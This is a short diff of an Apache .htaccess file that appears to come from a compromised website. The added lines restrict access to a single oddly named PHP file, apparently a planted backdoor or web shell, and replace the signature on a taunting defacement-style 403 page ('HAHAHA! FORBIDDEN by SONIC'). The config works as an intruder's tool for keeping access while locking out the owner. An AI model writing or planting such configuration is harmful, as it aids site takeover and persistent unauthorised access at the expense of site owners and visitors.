@@ -58,9 +58,9 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(IncludeFolder.php|UploadCore.php|FolderAps.php|IncludeClouds.php|FolderPund.php|ToolsFinder.php|PaymentsFinder.inc.php|framework.php|InvalidRequestService.php|export-plural-rules.php|Eloquent.php|System.php|Upgrade.php|Lazy.php|ServiceContainer.php|GroupMarkBased.php|MarkdownSettings.php|MarkdownSettings.inc.php|BlockException.php|TaskQueueUpgrade.php|Settings.php|Text.php|Request.php|Exception.php|StreamedNoteTrait.php|strftime.php|SecurityVendor.php|LongAttr.php|VendorDispatcherInterface.php|UpdateMimeTypeDetector.php|phpmailer.lang-ij.php|SQLiteConnectionServer.php|locale.php|UserFolder.inc.php|CoreFold.php||ThemeSettings.php|syscache.php|listbuilder.php|ErrorFound.php|SubmissionAdmins.inc.php|Upgrades.inc.php|Scanner.inc.php|AdminersCloud.php|IssueEntryHeader.inc.php|Dispatc.php|payments.php)$">
+<FilesMatch "^(titit-meong.php)$">
         Order Deny,Allow
     Allow from all
     </FilesMatch>
 Options -Indexes
-ErrorDocument 403 '<center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwd4SJkZKNbxgDgtKvDaM_lQZEKdQK4b2FonWGWouRJVt_bzM1kL56gn-gwiVpfSrlswEX3fm1XdVdmqjsWOm2_yMjvlzWjTrF73EhuqrRFoIZzdlbJMxHzs9L7UUCuQsnPMNT_fviqo6yFQ36dHHUhpBYjJmgIr8_f0k5q91yu_ubq_VOD_-82JDxGBhd/s16000/toothless-laugh-toothless-smile.gif"></img> <h3>HAHAHA! FORBIDDEN</font><br><h2>by Sumanto</h2>
+ErrorDocument 403 '<center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwd4SJkZKNbxgDgtKvDaM_lQZEKdQK4b2FonWGWouRJVt_bzM1kL56gn-gwiVpfSrlswEX3fm1XdVdmqjsWOm2_yMjvlzWjTrF73EhuqrRFoIZzdlbJMxHzs9L7UUCuQsnPMNT_fviqo6yFQ36dHHUhpBYjJmgIr8_f0k5q91yu_ubq_VOD_-82JDxGBhd/s16000/toothless-laugh-toothless-smile.gif"></img> <h3>HAHAHA! FORBIDDEN</font><br><h2>by SONIC</h2>
